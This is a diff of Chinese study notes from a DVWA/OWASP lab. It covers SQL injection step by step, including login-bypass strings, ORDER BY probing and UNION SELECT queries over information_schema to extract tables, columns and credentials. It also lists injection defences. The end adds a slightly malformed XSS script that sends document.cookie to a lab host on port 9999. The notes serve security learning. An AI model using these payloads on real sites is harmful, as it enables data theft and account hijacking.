@@ -105,7 +105,18 @@ SELECT *FROM User Where Username='**admin'--**'AND Password=''
 2. 猜測完整SQL語句並嘗試插入
 3. 推測欄位數、資料表名稱、
 UNION (?)前後可以接語句，串接語句然後印出來，但前後欄位數要一樣
-	
+
+injection Prevention
+1. 使用Prepared Statement(最安全作法)
+	用bind值不會因為單引號雙引號改變語句
+2. 使用Stored Procedures
+3. 嚴密檢查所有輸入值
+4. 使用過濾字串函數過濾非法字元，例如
+	mysql_real_escape_string(除非是utf-8否則無效)、addslashes
+5. 控管錯誤訊息只有管理者可以閱讀
+6. 控管資料庫及網站使用者帳號權限為何
+
+
 
 ##### OWASP
 開啟後有IP，輸入可以到網站進入
@@ -113,7 +124,7 @@ UNION (?)前後可以接語句，串接語句然後印出來，但前後欄位數要一樣
 帳號密碼admin
 - SQL injection
 	在bar輸入數字後可以發現ID: 3 First name: Hack Surname: Me
-	輸入'噴錯，代表可以用
+	輸入'噴錯，代表可以用(沒有保護的變數)
 	SELECT ? FROM ? WHERE id(?) = '**3'  #**'
 	3' #輸入後功能正常！中間空格是可以自己填的
 	輸入order by(取得欄位數量)→3'  order by 3# 錯誤可以知道只有兩個欄位
@@ -122,8 +133,9 @@ UNION (?)前後可以接語句，串接語句然後印出來，但前後欄位數要一樣
 	First name: dvwa@localhost ←db資訊
 	Surname: 5.1.41-3ubuntu12.6-log ←
 	看底下最後一個連結
-	先List Table
+	先List Table 撈出SQL其他欄位資訊
 	SELECT ? FROM ? WHERE id(?) = '3'  UNION SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'#'
+	回傳兩個 Table 結果 guestbook及users→看起來是users
 	再來List Columns
 	SELECT ? FROM ? WHERE id(?) = '3'  UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'#'
 	填空完成
@@ -138,5 +150,8 @@ UNION (?)前後可以接語句，串接語句然後印出來，但前後欄位數要一樣
 	5. 撈出SQL其他欄位資訊
 	6. 取出id=3的帳號密碼
 
- 
-
+XXS
+<script>
+document.write('<img src="http//192.168.57.1:9999/?cookie='document.cookie+'")
+</script>
+看到這段訊息的人會傳送cookie至駭客的電腦端，便可以盜用帳號
